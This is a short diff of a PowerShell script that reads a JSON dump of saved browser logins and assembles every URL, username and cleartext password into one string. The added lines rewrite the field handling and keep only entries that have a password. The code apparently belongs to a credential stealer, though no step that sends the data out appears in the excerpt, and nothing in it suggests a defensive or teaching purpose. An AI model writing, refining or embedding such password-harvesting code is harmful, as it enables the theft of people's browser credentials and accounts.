@@ -45,12 +45,13 @@ try {
             $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
             $browsers = ""
             foreach($item in $data) {
-                # Extract service name from URL
-                $service = "Unknown"
-                if($item.url -match "https?://(?:www\.)?([^/\.]+)\.[^/]+") {
-                    $service = $matches[1]
+                $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
+                $user = if($item.UserName) { $item.UserName } else { "" }
+                $pass = if($item.Password) { $item.Password } else { "" }
+                
+                if($pass) {
+                    $browsers += "$url`nUser: $user`nPass: $pass`n`n"
                 }
-                $browsers += "# $service`n$($item.url)`n  User: $($item.username)`n  Pass: $($item.password)`n`n"
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
